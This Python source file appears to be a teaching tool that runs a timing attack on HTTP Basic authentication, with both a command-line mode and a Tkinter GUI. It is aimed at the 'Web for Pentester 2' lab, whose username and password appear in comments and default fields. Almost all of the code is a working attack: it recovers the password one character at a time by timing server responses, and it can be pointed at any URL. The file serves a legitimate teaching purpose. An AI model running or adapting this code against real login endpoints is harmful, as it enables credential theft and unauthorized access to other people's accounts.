import requests
import time
import sys
import tkinter as tk
from tkinter import ttk, scrolledtext
# from threading import Thread
import threading

def runNoGUI():
    url=input("Enter the URL, like http://ip/authentication/example2/: ") 
    username=input("Enter the username: ") 
    # It is hacker for authentication example2 in web for pentester2
    password=input("Enter the start of the password if known, enter for none: ") 
    # The full password is p4ssw0rd for authentication example2 in web for pentester2
    lastTime=0

    request =requests.get(url, auth=(username, password))
    if request.status_code== 200:
    # This is to check if the entered password is correct
        print("You have entered the right password which is "+password)
    else:
        while request.status_code==401:
        # 401 Unauthorized response status code 
            for string in range(127):
            # Normal loop 0-127, this is for all ASCII codes 
            # https://www.ascii-code.com/ and https://python-reference.readthedocs.io/en/latest/docs/str/ASCII.html     
                start=time.time()
                request= requests.get(url, auth=(username, str(password+chr(string))))
                reqTime=time.time()-start
                print(string, chr(string))
                # chr() is to convert the string value into ASCII character
                print("The string",password+chr(string),"toke",reqTime, "second and it is not the password")  
                difTime =reqTime-lastTime
                print(difTime)
                lastTime=reqTime
                if 0.1 <= difTime <= 0.6:
                    # if the difference like 0.22 then tha character most likely correct, 
                    # while the not correct takes faster time like 0.0154 or much faster like 0.0025
                    print("Correct character")
                    password+=chr(string)
                    # add the correct character to the password string                   
                if request.status_code== 200:
                # if the status is 200 then the password assumed to be correct and the program should be stop 
                    print("The password is "+password)
                    exit()

def runGUI():
    global stopFlag
    stopFlag = False 
    def runAttack(url, username, passwordStart, outputText, minThresh, maxThresh):
        password = passwordStart
        lastTime = 0

        try:
            request = requests.get(url, auth=(username, password))
        except requests.RequestException as e:
            outputText.insert(tk.END, f"Initial request failed: {e}\n")
            return

        if request.status_code == 200:
            outputText.insert(tk.END, f"[+] SUCCESS! Password is: {password}\n")
            return
            
        resultLabel.config(text="In progress ...")
        while request.status_code == 401:
            # print (stopFlag)
            # for i in range(32, 127):  # printable ASCII characters only
            for i in range(97, 122):  # small leters for quick test
                if stopFlag:
                    outputText.insert(tk.END, "Attack stopped by user.\n")
                    resultLabel.config(text="Stopped!")
                    return
                testPass = password + chr(i)
                start = time.time()
                try:
                    request = requests.get(url, auth=(username, testPass))
                except requests.RequestException as e:
                    outputText.insert(tk.END, f"Request failed: {e}\n")
                    return
                reqTime = time.time() - start
                difTime = reqTime - lastTime
                lastTime = reqTime
                outputText.insert(tk.END, f"Trying: {testPass} | Time: {reqTime:.4f}s | Diff: {difTime:.4f}s\n")
                outputText.see(tk.END)

                if minThresh <= difTime <= maxThresh:
                    password += chr(i)
                    outputText.insert(tk.END, f"--> '{chr(i)}' is likely correct.\n")
                    if request.status_code == 200:
                        outputText.insert(tk.END, f"[+] SUCCESS! Password is: {testPass}\n")
                        resultLabel.config(text="Finished!")
                        return
                    break

                # if request.status_code == 200:
                #     outputText.insert(tk.END, f"[+] SUCCESS! Password is: {testPass}\n")
                #     return

    def stopAttack():
        global stopFlag
        stopFlag = True
        # print (stopFlag)

    def showHelp():
        helpWindow = tk.Toplevel(root)
        helpWindow.title("Help")
        helpWindow.geometry("950x400")
        helpText = tk.Text(helpWindow, wrap="word")
        helpText.insert("1.0", helpMenu())
        helpText.config(state="disabled")
        helpText.pack(fill="both", expand=True, padx=10, pady=10)

    def onStart():
        url = entryURL.get()
        user = entryUser.get()
        passStart = entryPassStart.get()
        try:
            minThresh = float(entryMinThresh.get())
            maxThresh = float(entryMaxThresh.get())
        except ValueError:
            outputText.insert(tk.END, "Invalid threshold values.\n")
            return

        resultLabel.config(text="Starting ...")
        outputText.delete("1.0", tk.END)
        threading.Thread(target=runAttack, args=(url, user, passStart, outputText, minThresh, maxThresh), daemon=True).start()

    root = tk.Tk()
    root.title("Password Timing Attack (Educational)")
    root.grid_rowconfigure(6, weight=1)
    root.grid_columnconfigure(1, weight=1)

    tk.Label(root, text="Target URL:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
    entryURL = tk.Entry(root, width=40)
    entryURL.grid(row=0, column=1, padx=10, pady=5, sticky="w")
    entryURL.insert(0, "http://192.168.8.169/authentication/example2/")

    tk.Label(root, text="Username:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    entryUser = tk.Entry(root, width=40)
    entryUser.grid(row=1, column=1, padx=10, pady=5, sticky="w")
    entryUser.insert(0, "hacker")

    tk.Label(root, text="Password start:").grid(row=2, column=0, padx=10, pady=5, sticky="e")
    entryPassStart = tk.Entry(root, width=40)
    entryPassStart.grid(row=2, column=1, padx=10, pady=5, sticky="w")
    entryPassStart.insert(0, "p4ssw0")

    tk.Label(root, text="Min accepted time:").grid(row=3, column=0, padx=10, pady=5, sticky="e")
    entryMinThresh = tk.Entry(root, width=40)
    entryMinThresh.grid(row=3, column=1, padx=10, pady=5, sticky="w")
    entryMinThresh.insert(0, "0.1")

    tk.Label(root, text="Max accepted time:").grid(row=4, column=0, padx=10, pady=5, sticky="e")
    entryMaxThresh = tk.Entry(root, width=40)
    entryMaxThresh.grid(row=4, column=1, padx=10, pady=5, sticky="w")
    entryMaxThresh.insert(0, "0.6")

    tk.Button(root, text="Start Attack", command=onStart).grid(row=5, column=1, sticky="w", padx=10, pady=5)
    tk.Button(root, text="Help", command=showHelp).grid(row=5, column=0, padx=10, pady=5, sticky="e")

    tk.Label(root, text="Status:").grid(row=6, column=0, padx=10, pady=5, sticky="e")
    resultLabel = tk.Label(root, text="Not active!", fg="green")
    resultLabel.grid(row=6, column=1, columnspan=2, padx=10, pady=5, sticky="w")

    # outputText = tk.Text(root, height=20)
    # outputText.grid(row=7, column=0, columnspan=2, padx=10, pady=10)

    frameOutput = tk.Frame(root)
    frameOutput.grid(row=7, column=0, columnspan=2, padx=10, pady=5, sticky="nsew")
    scrollbar = tk.Scrollbar(frameOutput)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    outputText = tk.Text(frameOutput, width=60, height=15, wrap="word", yscrollcommand=scrollbar.set)
    outputText.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar.config(command=outputText.yview)

    btnStop = tk.Button(root, text="Stop Attack", command=stopAttack, bg="green", fg="white")
    btnStop.grid(row=8, column=1, pady=5, sticky="w")

    root.mainloop() 

def helpMenu():
    characters="="*80     
    return f"""
{characters}
Created by Kaled Aljebur for learning purposes in teaching classes. 
{characters}
Usage:
    python script.py -a      Run in CLI mode
    python script.py         Run with GUI

Notes:
- This script uses timing differences to guess characters of the password.
- Server must return 200 on success and 401 on failure for this to work correctly.
- You may need to adjust the timing threshold (e.g., 0.1 <= difTime <= 0.6) depending on network speed.
"""

if __name__ == "__main__":
    if len(sys.argv) == 1:
        runGUI()
    elif len(sys.argv) == 2:
        if sys.argv[1] == "-a":
            runNoGUI()
        else:
            print(helpMenu())
    else:
        print(helpMenu())